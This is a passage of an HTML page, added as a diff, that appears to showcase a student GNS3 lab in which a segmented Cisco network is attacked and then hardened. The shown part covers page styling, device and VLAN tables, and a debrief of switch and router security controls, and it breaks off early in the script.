@@ -1,0 +1,1242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VaultBreak — Attack &amp; Defense Walkthrough</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@600;700;800&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+/* ============================= TOKENS ============================= */
+:root{
+  --navy-950:#081729;
+  --navy-900:#0E2440;
+  --navy-800:#123054;
+  --navy-700:#1B3D63;
+  --navy-600:#274C74;
+  --line-dim:rgba(143,211,255,0.22);
+  --line-bright:#8FD3FF;
+  --ink:#F2F6FA;
+  --ink-dim:#9FB4C7;
+  --ink-faint:#6F869B;
+  --brass:#D9A544;
+  --brass-bright:#F0C46B;
+  --secure:#3ED598;
+  --secure-dim:rgba(62,213,152,0.14);
+  --victim:#7FB2E8;
+  --c-flood:#FF6B4A;
+  --c-ghost:#5FA8FF;
+  --c-ledger:#E14F63;
+  --case-accent:#FF6B4A;
+  --font-display:'Big Shoulders Display', sans-serif;
+  --font-body:'IBM Plex Sans', sans-serif;
+  --font-mono:'IBM Plex Mono', monospace;
+}
+
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:
+    radial-gradient(ellipse at 20% -10%, rgba(95,168,211,0.10), transparent 55%),
+    radial-gradient(ellipse at 100% 0%, rgba(217,165,68,0.06), transparent 45%),
+    repeating-linear-gradient(0deg, rgba(143,211,255,0.035) 0px, rgba(143,211,255,0.035) 1px, transparent 1px, transparent 44px),
+    repeating-linear-gradient(90deg, rgba(143,211,255,0.035) 0px, rgba(143,211,255,0.035) 1px, transparent 1px, transparent 44px),
+    var(--navy-900);
+  color:var(--ink);
+  font-family:var(--font-body);
+  line-height:1.55;
+  -webkit-font-smoothing:antialiased;
+}
+h1,h2,h3,h4{font-family:var(--font-display);font-weight:800;letter-spacing:0.01em;margin:0;text-transform:uppercase;}
+p{margin:0;}
+a{color:inherit;}
+button{font-family:var(--font-body);cursor:pointer;}
+::selection{background:var(--brass);color:var(--navy-950);}
+:focus-visible{outline:2px solid var(--brass-bright);outline-offset:3px;}
+
+.eyebrow{
+  font-family:var(--font-mono);
+  font-size:0.72rem;
+  letter-spacing:0.16em;
+  text-transform:uppercase;
+  color:var(--ink-dim);
+}
+.chip{
+  display:inline-flex;align-items:center;gap:6px;
+  font-family:var(--font-mono);font-size:0.7rem;letter-spacing:0.04em;
+  padding:5px 10px;border-radius:3px;
+  border:1px solid var(--line-dim);color:var(--ink-dim);
+  background:rgba(143,211,255,0.04);
+  white-space:nowrap;
+}
+
+/* ============================= HEADER ============================= */
+header{
+  position:sticky;top:0;z-index:50;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 28px;
+  background:rgba(8,23,41,0.86);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line-dim);
+}
+.wordmark{display:flex;align-items:center;gap:10px;font-family:var(--font-display);font-size:1.15rem;letter-spacing:0.05em;}
+.wordmark .dot{width:10px;height:10px;border-radius:50%;background:var(--brass);box-shadow:0 0 10px var(--brass);}
+#landingNav{display:flex;gap:22px;}
+#landingNav a{
+  font-family:var(--font-mono);font-size:0.75rem;letter-spacing:0.08em;text-transform:uppercase;
+  color:var(--ink-dim);text-decoration:none;padding:6px 2px;border-bottom:1px solid transparent;
+  transition:color .2s, border-color .2s;
+}
+#landingNav a:hover{color:var(--ink);border-color:var(--brass);}
+#scenarioNav{display:none;align-items:center;gap:14px;}
+#scenarioNav.active{display:flex;}
+#landingNav.hidden{display:none;}
+#backBtn{
+  background:none;border:1px solid var(--line-dim);color:var(--ink-dim);
+  font-family:var(--font-mono);font-size:0.75rem;letter-spacing:0.04em;
+  padding:7px 12px;border-radius:3px;transition:all .2s;
+}
+#backBtn:hover{color:var(--ink);border-color:var(--brass);}
+#headerCaseTitle{font-family:var(--font-mono);font-size:0.78rem;letter-spacing:0.1em;color:var(--case-accent);text-transform:uppercase;}
+
+main{max-width:1180px;margin:0 auto;padding:0 28px;}
+
+/* ============================= HERO ============================= */
+.hero{padding:64px 0 40px;}
+.hero-top{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:22px;}
+.hero h1{
+  font-size:clamp(3.4rem, 9vw, 6.4rem);
+  line-height:0.92;
+  background:linear-gradient(180deg, var(--ink) 0%, var(--ink) 55%, var(--brass-bright) 150%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  margin-bottom:18px;
+}
+.hero-sub{
+  max-width:640px;font-size:1.08rem;color:var(--ink-dim);margin-bottom:26px;
+}
+.hero-meta{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:44px;}
+.hero-ctas{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:56px;}
+.btn-primary, .btn-ghost{
+  font-family:var(--font-mono);font-size:0.82rem;letter-spacing:0.05em;text-transform:uppercase;
+  padding:13px 22px;border-radius:3px;text-decoration:none;display:inline-flex;align-items:center;gap:8px;
+  transition:transform .15s ease, box-shadow .2s ease;
+}
+.btn-primary{background:var(--brass);color:var(--navy-950);border:1px solid var(--brass);font-weight:600;}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(217,165,68,0.25);}
+.btn-ghost{background:transparent;color:var(--ink);border:1px solid var(--line-dim);}
+.btn-ghost:hover{border-color:var(--line-bright);transform:translateY(-2px);}
+
+.hero-diagram-frame{
+  border:1px solid var(--line-dim);border-radius:10px;
+  background:linear-gradient(180deg, rgba(143,211,255,0.05), transparent);
+  padding:12px;
+}
+.svg-wrap{width:100%;}
+.svg-wrap svg{width:100%;height:auto;display:block;}
+
+/* ============================= TOPOLOGY SVG (shared styles) ============================= */
+.zone-rect{fill:rgba(143,211,255,0.05);stroke:var(--line-dim);stroke-width:1;stroke-dasharray:5 5;}
+.zone-label{font-family:var(--font-mono);font-size:11px;fill:var(--ink-faint);letter-spacing:0.03em;}
+.infra-link{stroke:var(--line-dim);stroke-width:1.5;}
+.node-ring{fill:var(--navy-800);stroke:var(--line-dim);stroke-width:2;transition:stroke .35s ease, filter .35s ease;}
+.node-code{font-family:var(--font-mono);font-weight:600;font-size:12px;fill:var(--ink-dim);text-anchor:middle;dominant-baseline:middle;transition:fill .35s ease;}
+.node-label{font-family:var(--font-mono);font-size:10.5px;fill:var(--ink-faint);text-anchor:middle;}
+.node-sub{font-family:var(--font-mono);font-size:9px;fill:var(--ink-faint);text-anchor:middle;opacity:0.7;}
+.node-badge{font-family:var(--font-mono);font-weight:700;font-size:12px;text-anchor:middle;dominant-baseline:middle;opacity:0;transition:opacity .3s ease;}
+
+.role-idle .node-ring{stroke:var(--line-dim);}
+.role-transit .node-ring{stroke:var(--line-bright);}
+.role-transit .node-code{fill:var(--ink);}
+
+.role-origin .node-ring{stroke:var(--case-accent);filter:drop-shadow(0 0 6px var(--case-accent));}
+.role-origin .node-code{fill:var(--ink);}
+.role-origin .node-badge{opacity:1;fill:var(--case-accent);}
+
+.role-compromised .node-ring{stroke:var(--case-accent);fill:rgba(255,107,74,0.10);filter:drop-shadow(0 0 8px var(--case-accent));}
+.role-compromised .node-code{fill:var(--ink);}
+.role-compromised .node-badge{opacity:1;fill:var(--case-accent);}
+
+.role-victim .node-ring{stroke:var(--victim);}
+.role-victim .node-code{fill:var(--ink);}
+.role-victim .node-badge{opacity:1;fill:var(--victim);}
+
+.role-secure .node-ring{stroke:var(--secure);fill:rgba(62,213,152,0.08);filter:drop-shadow(0 0 8px var(--secure));}
+.role-secure .node-code{fill:var(--ink);}
+.role-secure .node-badge{opacity:1;fill:var(--secure);}
+
+.role-isolated .node-ring{stroke:var(--ink-faint);opacity:0.45;}
+.role-isolated .node-code{fill:var(--ink-faint);opacity:0.6;}
+.role-isolated .node-badge{opacity:1;fill:var(--ink-faint);}
+
+@media (prefers-reduced-motion: no-preference){
+  .role-origin .node-ring, .role-compromised .node-ring{animation:svgpulse 1.7s ease-in-out infinite;}
+}
+@keyframes svgpulse{0%,100%{opacity:1;}50%{opacity:0.55;}}
+
+.attack-path{fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
+.attack-path.pre{stroke:var(--case-accent);stroke-dasharray:7 5;opacity:0.85;}
+.attack-path.post{stroke:var(--line-bright);stroke-dasharray:4 4;opacity:0.6;}
+.fanout-line{stroke:var(--case-accent);stroke-width:1;stroke-dasharray:2 4;opacity:0.35;}
+.packet-dot{filter:drop-shadow(0 0 5px currentColor);}
+.block-badge circle{fill:var(--navy-950);stroke:var(--secure);stroke-width:2;}
+.block-badge text{font-family:var(--font-mono);font-weight:700;font-size:13px;fill:var(--secure);text-anchor:middle;dominant-baseline:middle;}
+
+/* ambient hero dots */
+.ambient-dot{filter:drop-shadow(0 0 4px var(--brass-bright));}
+
+/* ============================= CASE CARDS ============================= */
+.section{padding:64px 0;border-top:1px solid var(--line-dim);}
+.section-head{max-width:640px;margin-bottom:34px;}
+.section-head h2{font-size:clamp(2rem,4vw,2.7rem);margin:8px 0 12px;}
+.section-head p{color:var(--ink-dim);}
+
+.case-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;}
+.case-card{
+  position:relative;
+  background:var(--navy-800);
+  border:1px solid var(--line-dim);
+  padding:26px 24px 22px;
+  clip-path:polygon(0 0, 88% 0, 100% 10%, 100% 100%, 0 100%);
+  display:flex;flex-direction:column;gap:14px;
+  cursor:pointer;
+  transition:transform .2s ease, border-color .2s ease, box-shadow .2s ease;
+  text-align:left;
+  color:inherit;
+}
+.case-card:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(0,0,0,0.35);}
+.case-card[data-case="flood"]{border-top:3px solid var(--c-flood);}
+.case-card[data-case="ghost"]{border-top:3px solid var(--c-ghost);}
+.case-card[data-case="ledger"]{border-top:3px solid var(--c-ledger);}
+.case-num{font-family:var(--font-mono);font-size:0.75rem;color:var(--ink-faint);letter-spacing:0.1em;}
+.case-card h3{font-size:1.7rem;line-height:1.05;}
+.case-kicker{font-family:var(--font-mono);font-size:0.78rem;color:var(--ink-dim);text-transform:uppercase;letter-spacing:0.04em;}
+.case-desc{color:var(--ink-dim);font-size:0.92rem;}
+.case-chips{display:flex;flex-wrap:wrap;gap:6px;}
+.case-course{font-family:var(--font-mono);font-size:0.7rem;color:var(--ink-faint);margin-top:auto;padding-top:8px;border-top:1px solid var(--line-dim);}
+.case-open{font-family:var(--font-mono);font-size:0.78rem;letter-spacing:0.04em;display:flex;align-items:center;gap:6px;}
+.case-card[data-case="flood"] .case-open{color:var(--c-flood);}
+.case-card[data-case="ghost"] .case-open{color:var(--c-ghost);}
+.case-card[data-case="ledger"] .case-open{color:var(--c-ledger);}
+
+/* ============================= TOPOLOGY / DEBRIEF TABLES ============================= */
+.info-grid{display:grid;grid-template-columns:1.1fr 0.9fr;gap:40px;align-items:start;}
+table.tech-table{width:100%;border-collapse:collapse;font-size:0.86rem;}
+table.tech-table th{
+  font-family:var(--font-mono);font-size:0.68rem;letter-spacing:0.08em;text-transform:uppercase;
+  color:var(--ink-faint);text-align:left;padding:8px 10px;border-bottom:1px solid var(--line-dim);
+}
+table.tech-table td{padding:10px 10px;border-bottom:1px solid rgba(143,211,255,0.08);color:var(--ink-dim);vertical-align:top;}
+table.tech-table td.mono, table.tech-table td strong{font-family:var(--font-mono);color:var(--ink);font-weight:600;}
+.vlan-strip{display:flex;gap:3px;margin-bottom:22px;}
+.vlan-strip div{flex:1;padding:10px 12px;border-radius:3px;font-family:var(--font-mono);font-size:0.72rem;}
+.vlan-strip .v10{background:rgba(255,107,74,0.12);border:1px solid rgba(255,107,74,0.3);}
+.vlan-strip .v20{background:rgba(95,168,255,0.12);border:1px solid rgba(95,168,255,0.3);}
+.vlan-strip .v99{background:rgba(217,165,68,0.12);border:1px solid rgba(217,165,68,0.3);}
+
+.debrief-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px;}
+.debrief-card{background:var(--navy-800);border:1px solid var(--line-dim);padding:18px 18px;border-radius:6px;}
+.debrief-card h4{font-size:1rem;color:var(--secure);margin-bottom:8px;letter-spacing:0.02em;}
+.debrief-card p{font-size:0.82rem;color:var(--ink-dim);margin-bottom:4px;}
+.debrief-card .loc{font-family:var(--font-mono);font-size:0.72rem;color:var(--ink-faint);}
+
+footer{padding:36px 0 60px;color:var(--ink-faint);font-size:0.8rem;border-top:1px solid var(--line-dim);}
+footer .foot-row{display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;}
+
+/* ============================= SCENARIO VIEW ============================= */
+#view-scenario{padding-top:38px;padding-bottom:80px;}
+.scenario-head{margin-bottom:30px;}
+.scenario-head .eyebrow{color:var(--case-accent);}
+.scenario-head h2{font-size:clamp(2.2rem,5vw,3.4rem);margin:6px 0 8px;}
+.scenario-head .kicker{color:var(--ink-dim);font-family:var(--font-mono);font-size:0.9rem;}
+
+.scenario-body{display:grid;grid-template-columns:400px 1fr;gap:36px;align-items:start;}
+.diagram-panel{position:sticky;top:88px;display:flex;flex-direction:column;gap:14px;}
+.mode-toggle{display:flex;border:1px solid var(--line-dim);border-radius:4px;overflow:hidden;}
+.mode-toggle button{
+  flex:1;background:var(--navy-800);color:var(--ink-dim);border:none;padding:11px 8px;
+  font-family:var(--font-mono);font-size:0.72rem;letter-spacing:0.03em;text-transform:uppercase;
+  transition:background .2s, color .2s;border-right:1px solid var(--line-dim);
+}
+.mode-toggle button:last-child{border-right:none;}
+.mode-toggle button[aria-pressed="true"]{background:var(--navy-700);color:var(--ink);}
+#modePre[aria-pressed="true"]{box-shadow:inset 0 -3px 0 var(--case-accent);}
+#modePost[aria-pressed="true"]{box-shadow:inset 0 -3px 0 var(--secure);}
+
+.diagram-frame{border:1px solid var(--line-dim);border-radius:8px;padding:10px;background:linear-gradient(180deg, rgba(143,211,255,0.04), transparent);}
+.diagram-legend{display:flex;flex-wrap:wrap;gap:8px;font-family:var(--font-mono);font-size:0.68rem;color:var(--ink-faint);}
+.diagram-legend span{display:inline-flex;align-items:center;gap:5px;}
+.legend-dot{width:8px;height:8px;border-radius:50%;display:inline-block;}
+.ghost-btn{
+  background:none;border:1px solid var(--line-dim);color:var(--ink-dim);
+  font-family:var(--font-mono);font-size:0.72rem;padding:9px 12px;border-radius:4px;
+  align-self:flex-start;transition:all .2s;
+}
+.ghost-btn:hover{color:var(--ink);border-color:var(--case-accent);}
+
+.content-panel{min-height:420px;}
+.step-dial-row{display:flex;align-items:center;gap:18px;margin-bottom:18px;flex-wrap:wrap;}
+.step-dots{display:flex;gap:8px;}
+.step-dot{
+  width:26px;height:26px;border-radius:50%;border:1px solid var(--line-dim);background:var(--navy-800);
+  color:var(--ink-faint);font-family:var(--font-mono);font-size:0.68rem;display:flex;align-items:center;justify-content:center;
+  transition:all .2s;
+}
+.step-dot.active{background:var(--case-accent);border-color:var(--case-accent);color:var(--navy-950);font-weight:700;}
+.step-dot.done{border-color:var(--case-accent);color:var(--case-accent);}
+.step-counter{font-family:var(--font-mono);font-size:0.72rem;color:var(--ink-faint);letter-spacing:0.08em;text-transform:uppercase;}
+
+#stepTitle{font-size:clamp(1.5rem,3vw,2.1rem);margin:10px 0 12px;}
+#stepNarrative{color:var(--ink-dim);font-size:0.98rem;margin-bottom:20px;max-width:640px;}
+
+.terminal{border:1px solid var(--line-dim);border-radius:8px;overflow:hidden;background:#081222;margin-bottom:18px;}
+.terminal-chrome{
+  display:flex;align-items:center;gap:6px;padding:9px 12px;background:var(--navy-800);border-bottom:1px solid var(--line-dim);
+}
+.terminal-chrome span{width:9px;height:9px;border-radius:50%;background:var(--ink-faint);opacity:0.5;}
+.terminal-chrome .term-path{
+  margin-left:8px;font-family:var(--font-mono);font-size:0.72rem;color:var(--ink-faint);opacity:1;width:auto;height:auto;border-radius:0;background:none;
+}
+.terminal-body{padding:16px 18px;font-family:var(--font-mono);font-size:0.84rem;min-height:60px;}
+.term-line{
+  color:var(--ink-dim);white-space:pre-wrap;word-break:break-word;padding:2px 0;
+}
+@media (prefers-reduced-motion: no-preference){
+  .term-line{opacity:0;animation:lineIn .35s ease forwards;}
+}
+@keyframes lineIn{from{opacity:0;transform:translateY(3px);}to{opacity:1;transform:translateY(0);}}
+.term-line.syslog{color:var(--secure);border-left:2px solid var(--secure);padding-left:10px;margin:4px 0;}
+.term-line .flag{font-weight:600;}
+.terminal.mode-pre .flag{color:var(--case-accent);}
+.terminal.mode-post .flag{color:var(--secure);}
+
+.defense-note{
+  border:1px solid var(--secure-dim);background:var(--secure-dim);border-radius:8px;padding:16px 18px;margin-bottom:22px;
+}
+.control-chip{
+  display:inline-block;font-family:var(--font-mono);font-size:0.68rem;letter-spacing:0.06em;text-transform:uppercase;
+  color:var(--secure);border:1px solid var(--secure);padding:4px 9px;border-radius:3px;margin-bottom:10px;
+}
+.defense-note p{color:var(--ink-dim);font-size:0.9rem;}
+
+.recap-box h3{font-size:1.7rem;margin-bottom:6px;color:var(--secure);}
+.recap-box .recap-lead{color:var(--ink-dim);margin-bottom:18px;}
+.recap-box ul{list-style:none;margin:0 0 22px;padding:0;display:flex;flex-direction:column;gap:10px;}
+.recap-box li{
+  display:flex;gap:10px;align-items:flex-start;background:var(--navy-800);border:1px solid var(--line-dim);
+  padding:12px 14px;border-radius:6px;font-size:0.9rem;color:var(--ink-dim);
+}
+.recap-box li::before{content:"✓";color:var(--secure);font-weight:700;font-family:var(--font-mono);}
+
+.step-nav{display:flex;justify-content:space-between;gap:14px;margin-top:10px;padding-top:20px;border-top:1px solid var(--line-dim);}
+.nav-btn{
+  font-family:var(--font-mono);font-size:0.8rem;letter-spacing:0.03em;text-transform:uppercase;
+  padding:12px 20px;border-radius:4px;border:1px solid var(--line-dim);background:var(--navy-800);color:var(--ink);
+  transition:all .2s;
+}
+.nav-btn:hover:not(:disabled){border-color:var(--case-accent);transform:translateY(-2px);}
+.nav-btn:disabled{opacity:0.35;cursor:not-allowed;}
+.nav-btn.primary{background:var(--case-accent);border-color:var(--case-accent);color:var(--navy-950);font-weight:600;}
+
+/* ============================= UTIL ============================= */
+[hidden]{display:none !important;}
+
+@media (max-width:900px){
+  .case-grid{grid-template-columns:1fr;}
+  .info-grid{grid-template-columns:1fr;}
+  .scenario-body{grid-template-columns:1fr;}
+  .diagram-panel{position:relative;top:0;}
+  #landingNav{display:none;}
+  header{padding:12px 18px;}
+  main{padding:0 18px;}
+}
+</style>
+</head>
+<body data-case="flood">
+
+<header>
+  <div class="wordmark"><span class="dot"></span>VAULTBREAK</div>
+  <nav id="landingNav">
+    <a href="#cases">Case Files</a>
+    <a href="#topology">Network Map</a>
+    <a href="#debrief">Debrief</a>
+  </nav>
+  <div id="scenarioNav">
+    <button id="backBtn">← Case Files</button>
+    <span id="headerCaseTitle"></span>
+  </div>
+</header>
+
+<main>
+
+<!-- ============================= LANDING VIEW ============================= -->
+<section id="view-landing">
+
+  <section class="hero">
+    <div class="hero-top">
+      <span class="chip">LINUX</span>
+      <span class="chip">INFORMATION SECURITY</span>
+      <span class="chip">NETWORK SECURITY</span>
+      <span class="chip">GNS3 · CISCO IOSv/IOSvL2</span>
+    </div>
+    <h1>VaultBreak</h1>
+    <p class="hero-sub">A segmented enterprise network, built from scratch in GNS3, breached three different ways — then hardened, step by step, until each attack fails on camera.</p>
+    <div class="hero-meta">
+      <span class="chip">7 devices</span>
+      <span class="chip">3 VLANs</span>
+      <span class="chip">3 breach cases</span>
+      <span class="chip">14-day build</span>
+    </div>
+    <div class="hero-ctas">
+      <a class="btn-primary" href="#cases">Open the case files ↓</a>
+      <a class="btn-ghost" href="#topology">View the network map</a>
+    </div>
+    <div class="hero-diagram-frame">
+      <div class="svg-wrap" id="heroSvgWrap"></div>
+    </div>
+  </section>
+
+  <section class="section" id="cases">
+    <div class="section-head">
+      <span class="eyebrow">Attack &amp; Defense Scenarios</span>
+      <h2>Case Files</h2>
+      <p>Three scenarios, three chapters of the syllabus, one shared network. Pick a breach — watch it succeed, then watch the hardening shut it down.</p>
+    </div>
+    <div class="case-grid" id="caseGrid"></div>
+  </section>
+
+  <section class="section" id="topology">
+    <div class="section-head">
+      <span class="eyebrow">The Build</span>
+      <h2>The Network</h2>
+      <p>Every scenario runs on the same topology: an edge router, a trunked core, two access switches, and three VLANs — kept off VLAN 1 on purpose.</p>
+    </div>
+    <div class="info-grid">
+      <div>
+        <table class="tech-table">
+          <thead><tr><th>Device</th><th>Role</th><th>Platform</th></tr></thead>
+          <tbody>
+            <tr><td><strong>R1</strong></td><td>Edge / gateway router — inter-VLAN routing, ACLs, AAA/SSH hardening</td><td class="mono">Cisco IOSv</td></tr>
+            <tr><td><strong>SW1</strong></td><td>Core switch — trunk backbone connecting R1, SW2, SW3</td><td class="mono">Cisco IOSvL2</td></tr>
+            <tr><td><strong>SW2</strong></td><td>Access switch — DMZ segment</td><td class="mono">Cisco IOSvL2</td></tr>
+            <tr><td><strong>SW3</strong></td><td>Access switch — Internal LAN segment</td><td class="mono">Cisco IOSvL2</td></tr>
+            <tr><td><strong>Kali-Attacker</strong></td><td>External threat actor / red-team machine</td><td class="mono">VM · Kali Linux</td></tr>
+            <tr><td><strong>DVWA-Server</strong></td><td>Vulnerable web app + hidden stego file</td><td class="mono">VM · DMZ VLAN</td></tr>
+            <tr><td><strong>Employee-PC1</strong></td><td>Internal LAN victim host</td><td class="mono">VPCS / VM</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div>
+        <div class="vlan-strip">
+          <div class="v10"><strong>VLAN 10 · DMZ</strong><br>192.168.10.0/24</div>
+          <div class="v20"><strong>VLAN 20 · INTERNAL</strong><br>192.168.20.0/24</div>
+          <div class="v99"><strong>VLAN 99 · MGMT</strong><br>192.168.99.0/24</div>
+        </div>
+        <table class="tech-table">
+          <thead><tr><th>Control</th><th>Location</th></tr></thead>
+          <tbody>
+            <tr><td>Port Security</td><td class="mono">SW2 / SW3 access ports</td></tr>
+            <tr><td>DHCP Snooping</td><td class="mono">SW1 trusted uplink</td></tr>
+            <tr><td>Dynamic ARP Inspection</td><td class="mono">SW1 + binding table</td></tr>
+            <tr><td>BPDU Guard + PortFast</td><td class="mono">All access ports</td></tr>
+            <tr><td>DTP disabled / native VLAN</td><td class="mono">All access ports</td></tr>
+            <tr><td>Extended ACL</td><td class="mono">R1, DMZ ↔ Internal</td></tr>
+            <tr><td>AAA + SSH</td><td class="mono">R1 and SW1</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="debrief">
+    <div class="section-head">
+      <span class="eyebrow">After the Build</span>
+      <h2>Security Controls Debrief</h2>
+      <p>Every control below gets exercised on camera at least once — attacked first, then defended, in the case files above.</p>
+    </div>
+    <div class="debrief-grid">
+      <div class="debrief-card"><h4>Port Security</h4><p>MAC address limits with a violation shutdown, stopping CAM table floods before they force a switch to fail open.</p><p class="loc">SW2 / SW3 access ports</p></div>
+      <div class="debrief-card"><h4>DHCP Snooping</h4><p>Only the uplink to SW1 is trusted; every access port is rate-limited against DHCP starvation and rogue servers.</p><p class="loc">SW1</p></div>
+      <div class="debrief-card"><h4>Dynamic ARP Inspection</h4><p>Validates every ARP reply against the DHCP snooping binding table, closing the door on ARP spoofing.</p><p class="loc">SW1 · Internal VLAN</p></div>
+      <div class="debrief-card"><h4>BPDU Guard + PortFast</h4><p>Access ports come up instantly for hosts but shut down the moment they see a BPDU — no rogue switches, no STP games.</p><p class="loc">SW2 / SW3</p></div>
+      <div class="debrief-card"><h4>DTP Disabled + Native VLAN</h4><p>No port will negotiate a trunk, and the native VLAN is moved off the default — no double-tagged frame has anywhere to hop to.</p><p class="loc">All access ports</p></div>
+      <div class="debrief-card"><h4>Extended ACL</h4><p>Blocks the DMZ from initiating traffic into the Internal VLAN — the safety net even if a DMZ host is fully compromised.</p><p class="loc">R1, DMZ ↔ Internal</p></div>
+      <div class="debrief-card"><h4>AAA + SSH</h4><p>Locks down device management so the network gear itself isn't the easiest thing on the network to take over.</p><p class="loc">R1 and SW1</p></div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="foot-row">
+      <span>VaultBreak — combined build for Linux, Information Security &amp; Network Security</span>
+      <span>GNS3 · Cisco IOSv/IOSvL2 · Kali Linux · DVWA · Wireshark</span>
+    </div>
+  </footer>
+
+</section>
+
+<!-- ============================= SCENARIO VIEW ============================= -->
+<section id="view-scenario" hidden>
+  <div class="scenario-head">
+    <span class="eyebrow" id="caseEyebrow"></span>
+    <h2 id="caseTitle"></h2>
+    <p class="kicker" id="caseKicker"></p>
+  </div>
+
+  <div class="scenario-body">
+    <aside class="diagram-panel">
+      <div class="mode-toggle" role="group" aria-label="Hardening state">
+        <button id="modePre" aria-pressed="true">⚠ Before Hardening</button>
+        <button id="modePost" aria-pressed="false">✓ After Hardening</button>
+      </div>
+      <div class="diagram-frame">
+        <div class="svg-wrap" id="scenarioSvgWrap"></div>
+      </div>
+      <div class="diagram-legend">
+        <span><span class="legend-dot" style="background:var(--case-accent)"></span>Attacker / active attack</span>
+        <span><span class="legend-dot" style="background:var(--victim)"></span>Target host</span>
+        <span><span class="legend-dot" style="background:var(--secure)"></span>Blocked / hardened</span>
+        <span><span class="legend-dot" style="background:var(--ink-faint)"></span>Idle</span>
+      </div>
+      <button class="ghost-btn" id="replayBtn">↻ Replay animation</button>
+    </aside>
+
+    <div class="content-panel">
+      <div class="step-dial-row">
+        <div class="step-dots" id="stepDots"></div>
+        <span class="step-counter" id="stepCounter"></span>
+      </div>
+
+      <div id="normalStep">
+        <h3 id="stepTitle"></h3>
+        <p id="stepNarrative"></p>
+        <div class="terminal" id="terminalBox">
+          <div class="terminal-chrome"><span></span><span></span><span></span><span class="term-path" id="termPath">kali@attacker</span></div>
+          <div class="terminal-body" id="terminalLines"></div>
+        </div>
+        <div class="defense-note" id="defenseNote" hidden>
+          <div class="control-chip" id="controlChip"></div>
+          <p id="defenseText"></p>
+        </div>
+      </div>
+
+      <div class="recap-box" id="recapBox" hidden>
+        <h3>Case Closed</h3>
+        <p class="recap-lead" id="recapLead"></p>
+        <ul id="recapList"></ul>
+      </div>
+
+      <div class="step-nav">
+        <button class="nav-btn" id="prevBtn">← Back</button>
+        <button class="nav-btn primary" id="nextBtn">Next →</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<script>
+(function(){
+"use strict";
+
+const REDUCED = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+/* ============================= NODE MAP ============================= */
+const NODES = {
+  kali: {x:100, y:190, code:'ATK', label:'Kali-Attacker', sub:'external'},
+  r1:   {x:560, y:70,  code:'R1',  label:'R1', sub:'edge router'},
+  sw1:  {x:560, y:225, code:'SW1', label:'SW1', sub:'core trunk'},
+  sw2:  {x:350, y:365, code:'SW2', label:'SW2', sub:'DMZ access'},
+  sw3:  {x:770, y:365, code:'SW3', label:'SW3', sub:'internal access'},
+  dvwa: {x:350, y:515, code:'SRV', label:'DVWA-Server', sub:'192.168.10.20'},
+  pc1:  {x:770, y:515, code:'PC1', label:'Employee-PC1', sub:'192.168.20.10'}
+};
+
+const BADGE = {origin:'>', compromised:'!', secure:'\u2713', isolated:'\u2715', victim:'?'};
+
+function escapeHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+
+/* ============================= SVG BUILDERS ============================= */
+function zonesAndLinksMarkup(){
+  return `
+    <rect class="zone-rect" x="235" y="300" width="235" height="270" rx="18"></rect>
+    <text class="zone-label" x="248" y="292">VLAN 10 · DMZ</text>
+    <rect class="zone-rect" x="655" y="300" width="235" height="270" rx="18"></rect>
+    <text class="zone-label" x="668" y="292">VLAN 20 · INTERNAL</text>
+    <text class="zone-label" x="600" y="205" fill="var(--brass)">VLAN 99 · MGMT</text>
+    <g class="infra-links">
+      <line class="infra-link" x1="${NODES.r1.x}" y1="${NODES.r1.y}" x2="${NODES.sw1.x}" y2="${NODES.sw1.y}"></line>
+      <line class="infra-link" x1="${NODES.sw1.x}" y1="${NODES.sw1.y}" x2="${NODES.sw2.x}" y2="${NODES.sw2.y}"></line>
+      <line class="infra-link" x1="${NODES.sw1.x}" y1="${NODES.sw1.y}" x2="${NODES.sw3.x}" y2="${NODES.sw3.y}"></line>
+      <line class="infra-link" x1="${NODES.sw2.x}" y1="${NODES.sw2.y}" x2="${NODES.dvwa.x}" y2="${NODES.dvwa.y}"></line>
+      <line class="infra-link" x1="${NODES.sw3.x}" y1="${NODES.sw3.y}" x2="${NODES.pc1.x}" y2="${NODES.pc1.y}"></line>
+    </g>
+  `;
+}
+
+function nodeMarkup(id, interactive){
+  const n = NODES[id];
+  const idAttr = interactive ? `id="scn-node-${id}"` : '';
+  return `
+    <g class="node role-idle" data-id="${id}" ${idAttr} transform="translate(${n.x},${n.y})">
+      <circle class="node-ring" r="30"></circle>
+      <text class="node-code">${n.code}</text>
+      <text class="node-badge" x="24" y="-24">${'{{badge}}'}</text>
+      <text class="node-label" y="48">${n.label}</text>
+      <text class="node-sub" y="60">${n.sub}</text>
+    </g>
+  `.replace('{{badge}}','');
+}
+
+function heroTopologyMarkup(){
+  return `
+  <svg viewBox="0 0 960 600" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+    <rect class="zone-rect" x="30" y="90" width="180" height="200" rx="16" opacity="0.5"></rect>
+    <text class="zone-label" x="42" y="82">UNTRUSTED / EXTERNAL</text>
+    ${zonesAndLinksMarkup()}
